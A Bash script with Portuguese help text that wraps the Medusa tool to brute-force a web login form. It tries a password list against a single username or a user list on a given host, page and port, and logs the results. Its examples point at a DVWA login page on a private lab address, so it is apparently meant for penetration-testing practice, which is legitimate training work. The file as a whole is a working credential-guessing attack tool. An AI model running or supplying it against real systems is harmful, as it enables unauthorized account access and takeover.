#!/usr/bin/env bash

set -euo pipefail

SCRIPT_NAME="$(basename "$0")"

usage() {
    cat <<EOF
Uso: $SCRIPT_NAME -s|-l -t TARGET -U USER|USERLIST -P PASSLIST -r PAGETGT [opções]

Modos:
  -s                Single user (um único usuário)
  -l                Lista de usuários (userlist)

Parâmetros obrigatórios:
  -t TARGET         IP ou hostname do alvo (ex: 192.168.56.101)
  -U USER|USERLIST  Usuário único (com -s) OU arquivo de usuários (com -l)
  -P PASSLIST       Arquivo de senhas
  -r PAGETGT        Caminho da página de login (ex: /dvwa/login.php)

Opções:
  -p PORT           Porta HTTP (padrão: 80)
  -o FILE           Arquivo de saída (log). Default: logs/webform_<target>_<data>.log
  -h                Mostra esta ajuda

Exemplos:
  Single user:
    ./$SCRIPT_NAME -s -t 192.168.56.101 -U admin -P passwords.txt -r /dvwa/login.php

  Lista de usuários:
    ./$SCRIPT_NAME -l -t 192.168.56.101 -U users.txt -P passwords.txt -r /dvwa/login.php

Obs:
  O script usa medusa com módulo HTTP, com:
    PAGE:'PAGETGT'
    FORM:'username=^USER^&password=^PASS^&Login=Login'
    FAIL:'Login failed'
EOF
}

MODE=""
TARGET=""
USER_SINGLE=""
USERLIST=""
GENERIC_U=""
PASSLIST=""
PAGETGT=""   # variável de página
PORT="80"
OUTPUT_FILE=""

while getopts ":slt:u:U:P:r:p:o:h" opt; do
    case "$opt" in
        s) MODE="single" ;;
        l) MODE="list" ;;
        t) TARGET="$OPTARG" ;;
        u) USER_SINGLE="$OPTARG" ;;   # atalho opcional pra single user
        U) GENERIC_U="$OPTARG" ;;     # pode ser user ou userlist, dependendo do modo
        P) PASSLIST="$OPTARG" ;;
        r) PAGETGT="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        h) usage; exit 0 ;;
        \?) echo "Opção inválida: -$OPTARG" >&2; usage; exit 1 ;;
        :)  echo "A opção -$OPTARG exige um argumento." >&2; usage; exit 1 ;;
    esac
done

# Valida modo
if [[ -z "$MODE" ]]; then
    echo "[X] Você precisa escolher -s (single user) OU -l (userlist)." >&2
    usage
    exit 1
fi

# Valida obrigatórios básicos
if [[ -z "$TARGET" || -z "$PASSLIST" || -z "$PAGETGT" ]]; then
    echo "[X] Parâmetros obrigatórios faltando (-t, -P ou -r)." >&2
    usage
    exit 1
fi

# Resolve USER / USERLIST conforme o modo
if [[ "$MODE" == "single" ]]; then
    # Se não tiver vindo em -u, pega o que veio em -U
    if [[ -z "$USER_SINGLE" && -n "$GENERIC_U" ]]; then
        USER_SINGLE="$GENERIC_U"
    fi

    if [[ -z "$USER_SINGLE" ]]; then
        echo "[X] Modo single user (-s) exige um usuário em -u ou -U." >&2
        exit 1
    fi
else
    # Modo lista
    if [[ -z "$USERLIST" && -n "$GENERIC_U" ]]; then
        USERLIST="$GENERIC_U"
    fi

    if [[ -z "$USERLIST" ]]; then
        echo "[X] Modo lista (-l) exige um arquivo de usuários em -U." >&2
        exit 1
    fi

    if [[ ! -f "$USERLIST" ]]; then
        echo "[X] Arquivo de usuários não encontrado: $USERLIST" >&2
        exit 1
    fi
fi

# Valida arquivos
if [[ ! -f "$PASSLIST" ]]; then
    echo "[X] Arquivo de senhas não encontrado: $PASSLIST" >&2
    exit 1
fi

# Confere se medusa existe
if ! command -v medusa >/dev/null 2>&1; then
    echo "[X] medusa não encontrado no PATH. Instale/configure primeiro." >&2
    exit 1
fi

# Prepara log
timestamp="$(date +'%Y%m%d_%H%M%S')"
if [[ -z "$OUTPUT_FILE" ]]; then
    mkdir -p logs
    OUTPUT_FILE="logs/webform_${TARGET}_${timestamp}.log"
fi

echo "[*] Target........: $TARGET"
echo "[*] Porta.........: $PORT"
echo "[*] Página (PAGETGT): $PAGETGT"
if [[ "$MODE" == "single" ]]; then
    echo "[*] Modo..........: SINGLE USER"
    echo "[*] Usuário.......: $USER_SINGLE"
else
    echo "[*] Modo..........: USERLIST"
    echo "[*] Userlist......: $USERLIST"
fi
echo "[*] Passlist......: $PASSLIST"
echo "[*] Log file......: $OUTPUT_FILE"
echo

run_medusa() {
    local user_flag=""
    local user_value=""

    if [[ "$MODE" == "single" ]]; then
        user_flag="-u"
        user_value="$USER_SINGLE"
    else
        user_flag="-U"
        user_value="$USERLIST"
    fi

    # Monta comando do Medusa baseado no que você passou
    local MEDUSA_CMD=(
        medusa
        -h "$TARGET"
        "$user_flag" "$user_value"
        -P "$PASSLIST"
        -M http
        -m "PAGE:$PAGETGT"
        -m "FORM:username=^USER^&password=^PASS^&Login=Login"
        -m "FAIL:Login failed"
        -t 6
    )

    echo "[*] Comando a ser executado:"
    printf ' %q' "${MEDUSA_CMD[@]}"
    echo
    echo

    # Executa de fato e loga saída
    "${MEDUSA_CMD[@]}" | tee "$OUTPUT_FILE"
}

run_medusa

echo "[*] Finalizado."
